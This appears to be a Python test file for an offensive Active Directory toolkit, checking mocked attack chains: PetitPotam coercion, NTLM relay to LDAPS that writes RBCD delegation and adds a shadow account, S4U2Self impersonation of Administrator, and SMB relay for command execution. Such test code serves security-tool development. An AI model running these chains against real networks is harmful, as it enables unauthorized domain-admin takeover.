#!/usr/bin/env python3
"""D5 — chain profiles beyond ESC8.

Two new profiles register alongside esc8:

  * rbcd            — coerce workstation → LDAPS relay writes
                      msDS-AllowedToActOnBehalfOfOtherIdentity →
                      S4U2Self impersonates a domain admin
  * smb-relay-exec  — coerce host A → SMB relay to signing-disabled
                      host B → command exec as caught principal

Both are configuration on top of D1-D4 primitives — no new
subprocess wrappers. The load-bearing surface changes are:

  * _ensure_listener is now profile-aware: reads ctx.relay_mode +
    ctx.relay_target instead of hardcoding esc8's adcs-cert shape
    (with backward-compat when only ctx.ca_endpoint is set — the
    esc8 CLI path stays unchanged).
  * Two new capture steps parse the RBCD-specific "Delegation
    rights modified" line + the smb-exec "cred-ok on SMB target"
    line into chain artifacts.
  * post:s4u2self step wraps impacket-getST to turn the RBCD
    shadow credential into a CIFS/target ticket impersonating a
    domain admin.
"""
import os
import socket
import sys
import tempfile
import threading
import unittest
from unittest.mock import patch, MagicMock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def _mk_run_result(stdout="", stderr="", exit_code=0, error=None,
                   timed_out=False):
    from fieldkit.runner import RunResult
    return RunResult(argv=["fake"], exit_code=exit_code, stdout=stdout,
                      stderr=stderr, error=error, timed_out=timed_out)


class RegistryTest(unittest.TestCase):

    def test_all_three_profiles_registered(self):
        # subset (not equality) — other test files may register
        # transient profiles for their own scenarios; those persist
        # in the module-scoped registry across the full suite run
        # but are irrelevant to whether the shipped three are here.
        from fieldkit.chain import known_profiles
        self.assertTrue(
            {"esc8", "rbcd", "smb-relay-exec"}.issubset(set(known_profiles())))

    def test_rbcd_profile_has_expected_step_order(self):
        from fieldkit.chain import profile
        ch = profile("rbcd")("10.0.0.10")
        self.assertEqual([s.name for s in ch.steps], [
            "preflight:reachability",
            "coerce:petitpotam",
            "relay:listen",
            "relay:capture",
            "post:s4u2self",
        ])

    def test_smb_relay_exec_profile_has_expected_step_order(self):
        from fieldkit.chain import profile
        ch = profile("smb-relay-exec")("10.0.0.10")
        self.assertEqual([s.name for s in ch.steps], [
            "preflight:reachability",
            "coerce:petitpotam",
            "relay:listen",
            "relay:capture",
        ])


class EnsureListenerProfileAwarenessTest(unittest.TestCase):
    """The refactor pin: _ensure_listener now reads ctx.relay_mode +
    ctx.relay_target for non-esc8 profiles. Backward-compat for esc8:
    ctx.ca_endpoint alone still works (relay_mode inferred)."""

    def test_no_relay_mode_and_no_ca_endpoint_yields_manual(self):
        from fieldkit.chain import _ensure_listener, Chain
        ch = Chain(profile="test", target="10.0.0.1", steps=())
        class Ctx: listener_ip = "10.0.0.5"      # everything else missing
        result = _ensure_listener(ch, Ctx())
        self.assertEqual(result.kind, "manual")
        self.assertIn("relay_mode", result.evidence)

    def test_no_listener_ip_yields_manual_for_every_profile(self):
        from fieldkit.chain import _ensure_listener, Chain
        ch = Chain(profile="rbcd", target="10.0.0.10", steps=())
        class Ctx:
            relay_mode = "ldap-rbcd"
            relay_target = "10.0.0.1"
        result = _ensure_listener(ch, Ctx())
        self.assertEqual(result.kind, "manual")
        self.assertIn("listener_ip", result.evidence)

    def test_esc8_backward_compat_via_ca_endpoint(self):
        # ctx.ca_endpoint set, ctx.relay_mode NOT set → still spawns
        # in adcs-cert mode. This preserves the D2-D4 esc8 CLI shape.
        from fieldkit.chain import _ensure_listener, Chain
        from fieldkit import relay as relay_mod

        class Ctx:
            listener_ip = "10.0.0.5"
            ca_endpoint = "ca.corp.local"
            template = "DomainController"
            relay_port_smb = 4445
            relay_port_http = 8080
            relay_tool_bin = "/usr/bin/impacket-ntlmrelayx"
            relay_bind_wait = 0.5

        ch = Chain(profile="esc8", target="10.0.0.1", steps=())
        # Captured target passed to relay.start — verify mode + target.
        captured = {}
        def _fake_start(*args, **kwargs):
            captured["target"] = kwargs["target"]
            listener = relay_mod.Listener(
                tool_bin=kwargs.get("tool_bin"),
                target=kwargs["target"],
                listener_ip=kwargs["listener_ip"],
                listener_uri=r"\\10.0.0.5\ANY")
            return listener
        with patch.object(relay_mod, "start", side_effect=_fake_start):
            _ensure_listener(ch, Ctx())
        self.assertEqual(captured["target"].mode, "adcs-cert")
        self.assertEqual(captured["target"].target, "ca.corp.local")

    def test_ldap_rbcd_mode_selects_ldaps_relay_target(self):
        from fieldkit.chain import _ensure_listener, Chain
        from fieldkit import relay as relay_mod

        class Ctx:
            listener_ip = "10.0.0.5"
            relay_mode = "ldap-rbcd"
            relay_target = "dc01.corp.local"
            relay_port_smb = 4445
            relay_port_http = 8080
            relay_tool_bin = "/usr/bin/impacket-ntlmrelayx"
            relay_bind_wait = 0.5

        ch = Chain(profile="rbcd", target="10.0.0.10", steps=())
        captured = {}
        def _fake_start(*args, **kwargs):
            captured["target"] = kwargs["target"]
            return relay_mod.Listener(
                tool_bin=kwargs.get("tool_bin"),
                target=kwargs["target"],
                listener_ip=kwargs["listener_ip"],
                listener_uri=r"\\10.0.0.5\ANY")
        with patch.object(relay_mod, "start", side_effect=_fake_start):
            _ensure_listener(ch, Ctx())
        self.assertEqual(captured["target"].mode, "ldap-rbcd")
        self.assertEqual(captured["target"].target, "dc01.corp.local")


class RBCDCaptureStepTest(unittest.TestCase):
    """_rbcd_capture_action reads ntlmrelayx's stdout for the
    "Delegation rights modified" line + shadow account parse."""

    def _mock_listener(self, captured_lines):
        from fieldkit.relay import Listener, RelayTarget
        listener = Listener(
            tool_bin="/usr/bin/impacket-ntlmrelayx",
            target=RelayTarget(mode="ldap-rbcd", target="dc01"),
            listener_uri=r"\\10.0.0.5\ANY",
            captured_lines=list(captured_lines))
        proc = MagicMock()
        proc.poll = MagicMock(return_value=None)
        proc.send_signal = MagicMock()
        proc.wait = MagicMock(return_value=0)
        listener.proc = proc
        return listener

    def test_delegation_success_parses_shadow_credential(self):
        from fieldkit.chain import _rbcd_capture_action, Chain
        listener = self._mock_listener([
            "[*] Authenticating against ldaps://dc01 as CORP/WS01$",
            "[*] Delegation rights modified successfully",
            "[*] New account [FKSHADOW$] with password [P@ssw0rd!123] added",
        ])
        class Ctx:
            _relay_listener = listener
            relay_wait_capture = 0.3
        ch = Chain(profile="rbcd", target="10.0.0.10", steps=())
        out = _rbcd_capture_action(ch, Ctx())
        self.assertEqual(out.kind, "ok")
        self.assertEqual(out.data["rbcd_shadow_user"], "FKSHADOW$")
        self.assertEqual(out.data["rbcd_shadow_pass"], "P@ssw0rd!123")
        self.assertEqual(out.data["rbcd_caught_principal"], "CORP/WS01$")

    def test_caught_but_no_delegation_success_maps_to_fail(self):
        from fieldkit.chain import _rbcd_capture_action, Chain
        listener = self._mock_listener([
            "[*] Authenticating against ldaps://dc01 as CORP/WS01$",
            "[!] LDAP write failed: insufficient rights",
        ])
        class Ctx:
            _relay_listener = listener
            relay_wait_capture = 0.3
        ch = Chain(profile="rbcd", target="10.0.0.10", steps=())
        out = _rbcd_capture_action(ch, Ctx())
        self.assertEqual(out.kind, "fail")
        self.assertIn("delegation edit", out.evidence)

    def test_no_listener_returns_fail(self):
        from fieldkit.chain import _rbcd_capture_action, Chain
        class Ctx: pass
        ch = Chain(profile="rbcd", target="10.0.0.10", steps=())
        out = _rbcd_capture_action(ch, Ctx())
        self.assertEqual(out.kind, "fail")
        self.assertIn("no relay listener", out.evidence)


class S4U2SelfStepTest(unittest.TestCase):

    def _chain_with(self, **artifacts):
        from fieldkit.chain import Chain
        ch = Chain(profile="rbcd", target="10.0.0.10", steps=())
        ch.artifacts.update({
            "rbcd_shadow_user": "FKSHADOW$",
            "rbcd_shadow_pass": "P@ssw0rd!",
            "rbcd_target": "10.0.0.10",
        })
        ch.artifacts.update(artifacts)
        return ch

    def test_missing_domain_fails(self):
        from fieldkit.chain import _s4u2self_action
        class Ctx: pass
        ch = self._chain_with()
        out = _s4u2self_action(ch, Ctx())
        self.assertEqual(out.kind, "fail")
        self.assertIn("domain", out.evidence)

    def test_no_tool_returns_manual_with_hint(self):
        from fieldkit.chain import _s4u2self_action
        with patch("shutil.which", return_value=None):
            class Ctx:
                domain = "CORP.LOCAL"
                impersonate = "Administrator"
            ch = self._chain_with()
            out = _s4u2self_action(ch, Ctx())
        self.assertEqual(out.kind, "manual")
        self.assertIn("impacket-getST", out.evidence)
        self.assertIn("CIFS/10.0.0.10", out.evidence)

    def test_ok_output_parses_ccache_path(self):
        from fieldkit.chain import _s4u2self_action
        from fieldkit import runner as runner_mod
        stdout = (
            "[*] Requesting S4U2Self ticket\n"
            "[*] Saving ticket in Administrator@CIFS_10.0.0.10@CORP.LOCAL.ccache\n"
        )
        with patch.object(runner_mod, "run",
                    return_value=_mk_run_result(stdout=stdout)):
            class Ctx:
                domain = "CORP.LOCAL"
                impersonate = "Administrator"
                s4u2self_tool_bin = "/usr/bin/impacket-getST"
                s4u2self_timeout = 5
            ch = self._chain_with()
            out = _s4u2self_action(ch, Ctx())
        self.assertEqual(out.kind, "ok")
        self.assertIn("Administrator@CIFS_10.0.0.10@CORP.LOCAL.ccache",
                       out.data["s4u2self_ccache"])
        self.assertEqual(out.data["s4u2self_impersonate"], "Administrator")

    def test_kdc_error_maps_to_fail(self):
        from fieldkit.chain import _s4u2self_action
        from fieldkit import runner as runner_mod
        with patch.object(runner_mod, "run",
                    return_value=_mk_run_result(
                        stdout="[-] KDC_ERR_BADOPTION\n")):
            class Ctx:
                domain = "CORP.LOCAL"
                impersonate = "Administrator"
                s4u2self_tool_bin = "/usr/bin/impacket-getST"
                s4u2self_timeout = 5
            ch = self._chain_with()
            out = _s4u2self_action(ch, Ctx())
        self.assertEqual(out.kind, "fail")


class SMBRelayCaptureStepTest(unittest.TestCase):

    def test_cred_ok_maps_to_ok_with_principal(self):
        from fieldkit.chain import _smb_relay_capture_action, Chain
        from fieldkit.relay import Listener, RelayTarget
        listener = Listener(
            tool_bin="/usr/bin/impacket-ntlmrelayx",
            target=RelayTarget(mode="smb-exec", target="10.0.0.20"),
            listener_uri=r"\\10.0.0.5\ANY",
            captured_lines=[
                "[*] Authenticating against smb://10.0.0.20 as CORP/WS01$",
                "[+] SUCCESS! [+] Authenticating against smb://10.0.0.20",
            ])
        proc = MagicMock()
        proc.poll = MagicMock(return_value=None)
        proc.send_signal = MagicMock(); proc.wait = MagicMock(return_value=0)
        listener.proc = proc
        class Ctx:
            _relay_listener = listener
            relay_wait_capture = 0.3
        ch = Chain(profile="smb-relay-exec", target="10.0.0.20", steps=())
        out = _smb_relay_capture_action(ch, Ctx())
        self.assertEqual(out.kind, "ok")
        self.assertEqual(out.data["smb_relay_principal"], "CORP/WS01$")

    def test_no_listener_fails(self):
        from fieldkit.chain import _smb_relay_capture_action, Chain
        class Ctx: pass
        ch = Chain(profile="smb-relay-exec", target="10.0.0.20", steps=())
        out = _smb_relay_capture_action(ch, Ctx())
        self.assertEqual(out.kind, "fail")


class RBCDEndToEndTest(unittest.TestCase):
    """Mock every subprocess; walk the rbcd chain against a
    workstation target; assert every step lands correctly with the
    RBCD-specific stdout signatures."""

    def _open_local_listener(self):
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        s.listen(1)
        port = s.getsockname()[1]
        def _acc():
            try:
                while True:
                    c, _ = s.accept()
                    c.close()
            except OSError:
                return
        threading.Thread(target=_acc, daemon=True).start()
        return port, s

    def _fake_ldap_relay_proc(self):
        proc = MagicMock()
        proc.pid = 4242
        proc.poll = MagicMock(return_value=None)
        proc.stdout = iter([
            "[*] Running in relay mode\n",
            "[*] Setting up SMB Server\n",
            "[*] Authenticating against ldaps://dc01 as CORP/WS01$\n",
            "[*] Delegation rights modified successfully\n",
            "[*] New account [FKSH$] with password [P@ss123!] added\n",
        ])
        proc.send_signal = MagicMock()
        proc.wait = MagicMock(return_value=0)
        return proc

    def _fake_run(self, argv, **kw):
        binary = argv[0] if argv else ""
        if "getST" in binary or "impacket-getST" in binary:
            return _mk_run_result(stdout=(
                "[*] Requesting S4U2Self ticket\n"
                "[*] Saving ticket in Administrator@CIFS_10.0.0.10@CORP.LOCAL.ccache\n"))
        return _mk_run_result()

    def test_rbcd_chain_proves_with_mocked_subprocesses(self):
        from fieldkit.chain import profile as chain_profile, walk

        port, sock = self._open_local_listener()
        self.addCleanup(sock.close)

        class Ctx:
            probe_port = port
            probe_timeout = 1.0
            listener_uri = None
            cred = None
            listener_ip = "10.0.0.5"
            relay_mode = "ldap-rbcd"
            relay_target = "dc01.corp.local"
            template = "DomainController"
            relay_port_smb = 4445
            relay_port_http = 8080
            relay_bind_addr = "0.0.0.0"
            relay_tool_bin = "/usr/bin/impacket-ntlmrelayx"
            relay_bind_wait = 0.5
            relay_wait_capture = 1.0
            petitpotam_tool_bin = None       # → manual (no PetitPotam here)
            petitpotam_timeout = 5
            domain = "CORP.LOCAL"
            impersonate = "Administrator"
            s4u2self_tool_bin = "/usr/bin/impacket-getST"
            s4u2self_timeout = 5
            dc_ip = "10.0.0.1"
            store = None

        ch = chain_profile("rbcd")("127.0.0.1")
        with patch("fieldkit.runner.spawn",
                    return_value=self._fake_ldap_relay_proc()), \
             patch("fieldkit.runner.run", side_effect=self._fake_run):
            walk(ch, Ctx())

        self.assertEqual(ch.status, "proven",
                         msg=f"outcomes: {[(s.name, o.kind, o.evidence[:80]) for s, o in zip(ch.steps, ch.outcomes)]}")
        self.assertEqual(len(ch.outcomes), 5)
        by_name = {ch.steps[i].name: ch.outcomes[i] for i in range(5)}
        self.assertEqual(by_name["preflight:reachability"].kind, "ok")
        self.assertEqual(by_name["coerce:petitpotam"].kind, "manual")   # no tool
        self.assertEqual(by_name["relay:listen"].kind, "ok")
        self.assertEqual(by_name["relay:capture"].kind, "ok")
        self.assertEqual(by_name["post:s4u2self"].kind, "ok")

        # Artifacts thread through the whole rbcd chain
        self.assertEqual(ch.artifacts["rbcd_shadow_user"], "FKSH$")
        self.assertEqual(ch.artifacts["rbcd_shadow_pass"], "P@ss123!")
        self.assertIn("Administrator@CIFS_10.0.0.10",
                       ch.artifacts["s4u2self_ccache"])


class SMBRelayExecEndToEndTest(unittest.TestCase):

    def _open_local_listener(self):
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        s.listen(1)
        port = s.getsockname()[1]
        def _acc():
            try:
                while True:
                    c, _ = s.accept()
                    c.close()
            except OSError:
                return
        threading.Thread(target=_acc, daemon=True).start()
        return port, s

    def test_smb_relay_exec_chain_proves(self):
        from fieldkit.chain import profile as chain_profile, walk

        port, sock = self._open_local_listener()
        self.addCleanup(sock.close)

        # ntlmrelayx signals cred-ok on the smb-exec relay outcome.
        proc = MagicMock()
        proc.pid = 42
        proc.poll = MagicMock(return_value=None)
        proc.stdout = iter([
            "[*] Running in relay mode\n",
            "[*] Setting up SMB Server\n",
            "[*] Authenticating against smb://10.0.0.20 as CORP/WS01$\n",
            "[+] SUCCESS! [+] Authenticating against smb://10.0.0.20\n",
        ])
        proc.send_signal = MagicMock()
        proc.wait = MagicMock(return_value=0)

        class Ctx:
            probe_port = port
            probe_timeout = 1.0
            listener_uri = None
            cred = None
            listener_ip = "10.0.0.5"
            relay_mode = "smb-exec"
            relay_target = "10.0.0.20"
            template = "DomainController"
            relay_port_smb = 4445
            relay_port_http = 8080
            relay_bind_addr = "0.0.0.0"
            relay_tool_bin = "/usr/bin/impacket-ntlmrelayx"
            relay_bind_wait = 0.5
            relay_wait_capture = 1.0
            petitpotam_tool_bin = None
            petitpotam_timeout = 5
            store = None

        ch = chain_profile("smb-relay-exec")("127.0.0.1")
        with patch("fieldkit.runner.spawn", return_value=proc):
            walk(ch, Ctx())
        self.assertEqual(ch.status, "proven",
                         msg=f"outcomes: {[(s.name, o.kind, o.evidence[:80]) for s, o in zip(ch.steps, ch.outcomes)]}")
        self.assertEqual(ch.artifacts["smb_relay_principal"], "CORP/WS01$")
        self.assertEqual(ch.artifacts["smb_relay_target"], "127.0.0.1")


if __name__ == "__main__":
    unittest.main()
